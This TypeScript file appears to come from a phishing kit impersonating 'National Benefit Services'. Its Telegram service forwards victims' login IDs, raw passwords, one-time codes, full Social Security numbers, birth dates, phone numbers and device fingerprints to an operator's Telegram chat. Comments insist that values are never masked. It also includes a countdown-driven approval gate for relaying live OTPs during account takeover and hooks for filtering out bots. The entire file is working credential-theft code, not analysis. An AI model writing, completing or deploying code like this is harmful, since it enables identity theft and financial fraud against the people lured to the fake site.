
import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
import { parseVisitorInfo } from "@/lib/parse-visitor-os"
import { sendTelegramApprovalWithCountdown } from "@/lib/telegram-approval-countdown"
import {
  buildLoginApprovalRequestBody,
  buildMethodApprovalRequestBody,
  buildOtpApprovalRequestBody,
} from "@/lib/telegram-approval-templates"
const SITE_NAME = "National Benefit Services";

export interface VisitorData {
  location: string;
  ip: string;
  ipV4?: string;
  ipV6?: string;
  timezone: string;
  isp: string;
  userAgent: string;
  screen: string;
  language: string;
  url?: string;
  referrer?: string;
  utcTime: string;
}

export interface BotVisitData {
  name: string;
  type: string;
  userAgent: string;
  ip: string;
  path: string;
  matchedPatterns: string[];
}

export interface LoginData {
  userId: string;
  password: string;
}

export interface VerificationData {
  verificationType: string;
  code: string;
}

export interface ForgotPasswordData {
  ssnLast4: string;
  birthDate: string;
}

export interface NewUserData {
  ssnLast4: string;
  birthDate: string;
}

export interface AccountFoundData {
  method: string;
  password?: string;
}

export interface RememberDeviceData {
  choice: string;
}

export interface VerifyDetailsData {
  ssn: string;
  birthDate: string;
  phone: string;
  zip: string;
}

class TelegramService {
  private botToken: string;
  private chatIds: string[];

  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN || "";
    const raw =
      process.env.TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_IDS || "";
    this.chatIds = raw
      .split(",")
      .map((id) => id.trim())
      .filter((id) => id.length > 0);
  }

  private async sendMessage(message: string): Promise<void> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.error(
        "Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
      );
      return;
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

    try {
      await Promise.all(
        this.chatIds.map((chatId) =>
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
            }),
          }),
        ),
      );
    } catch (error) {
      console.error("Failed to send Telegram message:", error);
    }
  }

  async sendVisitorNotification(data: VisitorData): Promise<void> {
    const ipV4 = data.ipV4;
    const ipV6 = data.ipV6;
    let ipDisplay = data.ip;

    if (ipV4 && ipV6) {
      ipDisplay = `${ipV4} (IPv4), ${ipV6} (IPv6)`;
    } else if (ipV4) {
      ipDisplay = `${ipV4} (IPv4)`;
    } else if (ipV6) {
      ipDisplay = `${ipV6} (IPv6)`;
    }

    const pageUrl = data.url ?? "(unknown)";
    const rawReferrer = (data.referrer ?? "").trim();
    const referrer =
      rawReferrer !== ""
        ? rawReferrer
        : "Direct / no referrer (typed URL, bookmark, or referrer stripped by browser)";

    const detected = parseVisitorInfo(data.userAgent)
    const networkHint = getNetworkHintLabel(null, data.isp)
    const message = `\n🌐 <b>(${SITE_NAME})</b>\n━━━━━━━━━━━━━━━━━━\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${ipDisplay}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}${networkHint ? `\n🛡️ <b>VPN/DATA CENTER:</b> ${networkHint}` : ""}\n\n🖥 <b>Platform:</b> ${detected.platformLabel}\n👨‍💻 <b>Browser:</b> ${detected.browserLabel}\n📱 <b>Device:</b> ${detected.deviceLabel}\n🖥️ <b>Screen:</b> ${data.screen}\n🔗 <b>Referrer:</b> ${referrer}\n🌐 <b>URL:</b> ${pageUrl}\n\n<a href="https://t.me/th3_allfather">All Father</a>`;
    await this.sendMessage(message);
  }

  async sendBotVisitNotification(data: BotVisitData): Promise<void> {
    const patternsText =
      data.matchedPatterns && data.matchedPatterns.length > 0
        ? data.matchedPatterns.join(", ")
        : "Unknown";

    const message =
      `\n🤖 <b>BOT</b>\n\n` +
      `🧩 <b>Name:</b> ${data.name}\n` +
      `📝 <b>Type:</b> ${data.type}\n\n` +
      `🤖 <b>User-Agent:</b>\n${data.userAgent}\n\n` +
      `📍 <b>IP:</b> ${data.ip}\n` +
      `🔗 <b>Path:</b> ${data.path}\n\n` +
      `📋 <b>Bot Function:</b> Matched bot pattern(s): ${patternsText}.`;

    await this.sendMessage(message);
  }

  async sendLoginNotification(data: LoginData): Promise<void> {
    // Canonical template (Testing 2 catalogue §3): flow header, ━ rule under the
    // title, adaptive identifier label, raw unmasked password, NO status line.
    const message = wrapFlowMessage(
      [
        `🔐 <b>Login Attempt</b>`,
        FLOW_RULE,
        formatIdentifierLine(data.userId),
        `🔒 <b>Password:</b> ${asCode(data.password)}`,
      ].join("\n")
    );
    await this.sendMessage(message);
  }

  async sendVerificationNotification(data: VerificationData): Promise<void> {
    // Canonical template (catalogue §8). The code is transmitted raw — RULE 1B.
    // This event carries no identifier, so the body is title + rule + code.
    const message = wrapFlowMessage(
      [
        `🔑 <b>Verification Code Submitted</b>`,
        FLOW_RULE,
        `🔢 <b>Code:</b> ${asCode(data.code)}`,
      ].join("\n")
    );
    await this.sendMessage(message);
  }

  async sendVerificationClickNotification(
    verificationType: string,
    ip?: string,
  ): Promise<void> {
    // Canonical method-selection wording (catalogue §5/§7): flow header, ━ rule
    // under the title, and a `Method Selected:` line.
    const message = wrapFlowMessage(
      [
        `🔐 <b>Verify Your Identity</b>`,
        FLOW_RULE,
        `📧 <b>Method Selected:</b> ${asCode(verificationType)}`,
      ].join("\n")
    );
    await this.sendMessage(message);
  }

  async sendResendCodeNotification(
    isSecondOtp: boolean,
    ip?: string,
  ): Promise<void> {
    // Canonical template (catalogue §8 "Resend Code Clicked").
    const message = wrapFlowMessage(
      [`🔔 <b>Resend Code Clicked</b>`, FLOW_RULE].join("\n")
    );
    await this.sendMessage(message);
  }

  async sendForgotPasswordPageViewNotification(ip?: string): Promise<void> {
    const message = `\n🔗 <b>Forgot Password page opened - ${SITE_NAME}</b>\n\nUser clicked "Forgot User ID or Password?" and landed on the form.`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordNotification(
    data: ForgotPasswordData,
  ): Promise<void> {
    const message = `\n🔑 <b>Forgot Password – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
    await this.sendMessage(message);
  }

  async sendNewUserPageViewNotification(ip?: string): Promise<void> {
    const message = `\n🔗 <b>New User page opened - ${SITE_NAME}</b>\n\nUser clicked "New User?" and landed on the form.`;
    await this.sendMessage(message);
  }

  async sendNewUserNotification(data: NewUserData): Promise<void> {
    const message = `\n👤 <b>New User – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
    await this.sendMessage(message);
  }

  async sendNewUserCodePageViewNotification(ip?: string): Promise<void> {
    const message = `\n🔗 <b>New User – Enter Access Code page opened - ${SITE_NAME}</b>\n\nUser landed on the page to enter the code sent to them.`;
    await this.sendMessage(message);
  }

  async sendNewUserCodeNotification(code: string, ip?: string): Promise<void> {
    const message = `\n🔢 <b>New User – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
    await this.sendMessage(message);
  }

  async sendNewUserPasswordPageViewNotification(ip?: string): Promise<void> {
    const message = `\n🔗 <b>New User – Create Password page opened - ${SITE_NAME}</b>\n\nUser landed on the page to create their password.`;
    await this.sendMessage(message);
  }

  async sendNewUserPasswordNotification(
    password: string,
    ip?: string,
  ): Promise<void> {
    const message = `\n🔑 <b>New User – Password Set - ${SITE_NAME}</b>\n\n🔑 <b>Password:</b> ${password}`;
    await this.sendMessage(message);
  }

  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
    const passwordText = data.password
      ? `\n🔑 <b>Password:</b> ${data.password}`
      : "";
    const message = `\n✅ <b>Account Found – Continue Clicked - ${SITE_NAME}</b>\n\n🔐 <b>Method:</b> ${data.method}${passwordText}`;
    await this.sendMessage(message);
  }

  async sendAccountFoundResetPasswordNotification(ip?: string): Promise<void> {
    const message =
      `\n🔗 <b>Account Found – Reset password link clicked - ${SITE_NAME}</b>\n\n` +
      `User clicked "Reset password" on the account found page.`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordVerifyNotification(
    verificationType: string,
    ip?: string,
  ): Promise<void> {
    const message = `\n🔐 <b>Forgot Password – Verify Identity Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordCodeNotification(
    code: string,
    ip?: string,
  ): Promise<void> {
    const message = `\n🔢 <b>Forgot Password – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordResendNotification(ip?: string): Promise<void> {
    const message = `\n🔄 <b>Forgot Password – Resend Code Requested - ${SITE_NAME}</b>`;
    await this.sendMessage(message);
  }

  async sendRememberDeviceNotification(
    data: RememberDeviceData,
  ): Promise<void> {
    const message = `\n💾 <b>Remember Device Choice - ${SITE_NAME}</b>\n\n📱 <b>Choice:</b> ${data.choice}`;
    await this.sendMessage(message);
  }

  async sendVerifyDetailsNotification(data: VerifyDetailsData): Promise<void> {
    const message =
      `\n📝 <b>Verify Details – form submitted - ${SITE_NAME}</b>\n\n` +
      `🔢 <b>SSN:</b> ${data.ssn}\n` +
      `📅 <b>Birth Date:</b> ${data.birthDate}\n` +
      `📞 <b>Phone:</b> ${data.phone}\n` +
      `📍 <b>ZIP Code:</b> ${data.zip}`;
    await this.sendMessage(message);
  }

  async sendBlockedBotNotification(data: {
    userAgent: string;
    ip: string;
    path: string;
  }): Promise<void> {
    const msg = `\n🚫 <b>Bad Bot Blocked - ${SITE_NAME}</b>\n\n🤖 <b>User-Agent:</b> ${data.userAgent}\n🌍 <b>IP:</b> ${data.ip}\n🔗 <b>Path:</b> ${data.path}`;
    await this.sendMessage(msg);
  }

  // ── Admin approval gate (Step 3 Sector C) ──────────────────────────────────
  // Kit parity: `app/api/pending-login` drives the approve/deny gate. These three
  // methods render the live countdown request so the operator can act inside the
  // approval window. `verificationType` payloads stay 100% raw — RULE 1B forbids
  // masking passwords and OTPs here.
  async sendLoginApprovalNotification(data: {
    userId: string;
    password: string;
    method: "email" | "text";
    createdAtMs: number;
    databaseShard?: string;
    ip?: string;
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : "/admin/login";
    await sendTelegramApprovalWithCountdown({
      botToken: process.env.TELEGRAM_BOT_TOKEN || "",
      chatIds: approvalChatIds(),
      createdAtMs: data.createdAtMs,
      wrapMessage: wrapFlowMessage,
      buildText: (secondsLeft) =>
        buildLoginApprovalRequestBody({
          userId: data.userId,
          password: data.password,
          method: data.method,
          adminLink,
          secondsLeft,
          databaseShard: data.databaseShard,
          asCode,
          asLink,
        }),
    });
  }

  async sendVerificationApprovalNotification(data: {
    userId: string;
    method: "email" | "text";
    code: string;
    createdAtMs: number;
    databaseShard?: string;
    ip?: string;
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : "/admin/login";
    await sendTelegramApprovalWithCountdown({
      botToken: process.env.TELEGRAM_BOT_TOKEN || "",
      chatIds: approvalChatIds(),
      createdAtMs: data.createdAtMs,
      wrapMessage: wrapFlowMessage,
      buildText: (secondsLeft) =>
        buildOtpApprovalRequestBody({
          userId: data.userId,
          code: data.code,
          method: data.method,
          adminLink,
          secondsLeft,
          databaseShard: data.databaseShard,
          asCode,
          asLink,
        }),
    });
  }

  async sendMethodApprovalNotification(data: {
    userId: string;
    method: "email" | "text" | "sms";
    createdAtMs: number;
    ip?: string;
  }): Promise<void> {
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : "/admin/login";
    await sendTelegramApprovalWithCountdown({
      botToken: process.env.TELEGRAM_BOT_TOKEN || "",
      chatIds: approvalChatIds(),
      createdAtMs: data.createdAtMs,
      wrapMessage: wrapFlowMessage,
      buildText: (secondsLeft) =>
        buildMethodApprovalRequestBody({
          userId: data.userId,
          method: data.method,
          adminLink,
          secondsLeft,
          asCode,
          asLink,
        }),
    });
  }
}

// ── Approval-gate helpers (Step 3 Sector C) ──────────────────────────────────
// Ported from the kit so the existing 22 send*Notification methods above stay
// intact. Only Telegram HTML entity escaping is applied (RULE 1B) — values are
// never masked, truncated or redacted.

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim());
}

function ensureAbsoluteHttpUrl(value: string): string {
  const t = value.trim();
  if (!t || isHttpUrl(t) || t.startsWith("/")) return t;
  if (/^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(t)) return `https://${t}`;
  return t;
}

function normalizeAdminPortalUrl(raw?: string): string {
  const t = ensureAbsoluteHttpUrl((raw ?? "").trim());
  if (!t) return "/admin/login";
  const origin = t
    .replace(/\/admin\/login.*$/i, "")
    .replace(/\?.*$/, "")
    .replace(/\/+$/, "");
  return origin || "/admin/login";
}

function adminPortalLink(): string {
  return normalizeAdminPortalUrl(process.env.ADMIN_PORTAL_URL);
}

function asCode(value: unknown): string {
  const t =
    value == null || value === "" ? "Unknown" : String(value).trim() || "Unknown";
  return `<code>${escapeTelegramHtml(t)}</code>`;
}

function asLink(url: string, label?: string): string {
  const href = ensureAbsoluteHttpUrl(url.trim());
  const linkText = (label?.trim() || href).trim();
  if (!href || !isHttpUrl(href)) {
    if (label?.trim()) return escapeTelegramHtml(label.trim());
    return asCode(href || "Unknown");
  }
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(
    linkText
  )}</a>`;
}

/** Site header block required at the top of every ops flow message. */
export function wrapFlowMessage(body: string): string {
  return `🏷️ <b>${escapeTelegramHtml(SITE_NAME)}</b>\n${FLOW_RULE}\n\n${body}`;
}

/**
 * In-flow separator: the Unicode box-drawing horizontal character `━` (U+2501),
 * 18 characters. Plain hyphens or underscores are an instant parity failure.
 */
const FLOW_RULE = "━".repeat(18);

/**
 * Identifier line with an adaptive label, per the catalogue:
 * `👤 User ID:` / `👤 Username:` / `📧 Email:` / `📱 Phone:` based on the value.
 * Returns an empty string when there is no identifier, so callers can filter it.
 */
function formatIdentifierLine(userId?: string): string {
  const raw = (userId ?? "").trim();
  if (!raw) return "";
  if (raw.includes("@")) return `📧 <b>Email:</b> ${asCode(raw)}`;
  const digits = raw.replace(/\D/g, "");
  if (digits.length >= 10 && digits.length <= 15 && !raw.includes("@")) {
    return `📱 <b>Phone:</b> ${asCode(raw)}`;
  }
  if (/user\s*id/i.test(raw)) return `👤 <b>User ID:</b> ${asCode(raw)}`;
  return `👤 <b>Username:</b> ${asCode(raw)}`;
}

function approvalChatIds(): string[] {
  const raw = process.env.TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_IDS || "";
  return raw
    .split(/[,;\n]/)
    .map((id) => id.trim())
    .filter((id) => id.length > 0);
}

export const telegramService = new TelegramService();
